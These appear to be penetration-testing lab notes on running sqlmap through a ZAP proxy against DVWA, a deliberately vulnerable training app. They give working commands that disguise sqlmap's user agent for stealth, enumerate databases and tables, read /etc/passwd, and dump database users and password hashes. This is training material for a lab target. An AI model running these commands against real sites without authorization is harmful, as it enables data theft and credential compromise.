<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>sqlmap + Proxy(ZAP)</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>sqlmap + Proxy(ZAP)</h1><br />Vulnerable machine used in this lab: <a
      href="https://www.vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/">https://www.vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/</a><br /><br /><strong>Test
      for </strong><a
      href="on_Test_Methodology--WebApp_Pentest--Exploitation--Server-side--SQL_injections(SQLi)--Visibility_of_SQLi--In-Band-Inline-UNION_based_SQLi.html">In-Band/Inline
      SQLi</a><strong>-error based (Simplest form of SQLi visibility type)</strong><br /> 1) Valid value<br /> <a
      href=""><img src="images/1561-1.png" alt="images/1561-1.png" /></a><br /> 2) value followed by single quote
    (<strong>&#39;</strong>) → <code>1&#39;</code><br /> <a href=""><img src="images/1561-2.png"
        alt="images/1561-2.png" /></a><br /><br /><strong>Execution of sqlmap against the target using a cookie and
      proxied through ZAP</strong><br />1. Go to the History of ZAP and select the Request(GET) with the cookie of the
    site visited with the Browser<br />2. Highlight the COOKIE and copy it<br /> <a href=""><img src="images/1561-3.png"
        alt="images/1561-3.png" /></a><br /> PHPSESSID=tq2k875ke0bsekiikf7mph4dn4<br />3. Use the COOKIE with sqlmap
    <br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;PASTE&nbsp;COPIED&nbsp;COOKIE&nbsp;HERE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch
      </div>
    </div><br /> <a href=""><img src="images/1561-4.png" alt="images/1561-4.png" /></a><br /><br /><strong>Customize
      sqlmap User Agent(UA)</strong><br />The default User Agent used by sqlmap is
    <code>sqlmap/1.3.6.57#dev (http://sqlmap.org)</code>. We need to change it, if we want to be more stealty<br /> <a
      href=""><img src="images/1561-5.png" alt="images/1561-5.png" /></a><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;tq2k875ke0bsekiikf7mph4dn4&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox
      </div>
    </div><br /> <a href=""><img src="images/1561-6.png" alt="images/1561-6.png" /></a><br /><br /><strong>Enumerate the
      Databases</strong><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;--dbs
      </div>
    </div><br /> <a href=""><img src="images/1561-7.png" alt="images/1561-7.png" /></a><br /><br /><strong>List table of
      a database that we have found</strong><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;-D&nbsp;[database]&nbsp;--tables
      </div>
    </div><br /> <a href=""><img src="images/1561-8.png" alt="images/1561-8.png" /></a><br /><br /><strong>Only count
      the row in a table without disclose them</strong><br />If we interact with an <span
      style="text-decoration:underline;">application that store sensitive data</span> and the organization does not want
    that is disclosed, even to you, we can also only count the numbers of the table. This operation anyway means also
    that we could have exﬁltrated the data<br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;-D&nbsp;sqli&nbsp;-T&nbsp;Customers&nbsp;--count
      </div>
    </div><br /> <a href=""><img src="images/1561-9.png" alt="images/1561-9.png" /></a><br /> <br /><strong>Read file on
      the System</strong><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;--file-read&nbsp;/etc/passwd
      </div>
    </div><br />Note that rather than displaying the information, sqlmap writes the ﬁle locally here:
    <code>$HOME/.sqlmap/output/[site]/files/</code><br /> <a href=""><img src="images/1561-10.png"
        alt="images/1561-10.png" /></a><br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;cat&nbsp;<span style="color:#000000;font-weight:400">[</span>savedFile<span
          style="color:#000000;font-weight:400">]</span></div>
    </div><br /> <a href=""><img src="images/1561-11.png" alt="images/1561-11.png" /></a><br /><br /><strong>Dump
      database users and password hashes</strong><br />
    <div class="codebox">
      <div class="codebox">
        root@kali:/#&nbsp;sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;--file-read&nbsp;/etc/passwd&nbsp;--users&nbsp;--passwords
      </div>
    </div><br /> ◇ Users<br /> <a href=""><img src="images/1561-12.png" alt="images/1561-12.png" /></a><br /> ◇ Password
    Hashes (It take some time, dictionay based cracking)<br /> <a href=""><img src="images/1561-13.png"
        alt="images/1561-13.png" /></a><br /><br /><strong>Search name of columns inside a big database</strong><br />If
    we a Database with a lot of Tables and inside these Tables a lot of columns, is useful do a quick search for
    relevant results<br />Switch <code>--search</code> needs to be used in conjunction with one of the following support
    options:<br /> ◇ <code>-C</code> following a list of comma-separated column names to look for across the whole
    database management system<br /> ◇ <code>-T</code> following a list of comma-separated table names to look for
    across the whole database management system<br /> ◇ <code>-D</code> following a list of comma-separated database
    names to look for across the database management system<br />
    <div class="codebox">
      <div class="codebox">
        sqlmap&nbsp;-u&nbsp;&quot;https://dvwa.example.org/vulnerabilities/sqli/?id=1&amp;Submit=Submit&quot;&nbsp;--cookie=&quot;COOKIE&nbsp;VALUE&quot;&nbsp;--proxy&nbsp;http://localhost:8081&nbsp;--batch&nbsp;--user-agent&nbsp;MozillaFox&nbsp;-D&nbsp;my_wiki&nbsp;--search&nbsp;-C&nbsp;[keyword]&nbsp;--batch
      </div>
    </div><br /> <a href=""><img src="images/1561-14.png" alt="images/1561-14.png" /></a><br />
  </div>
</body>

</html>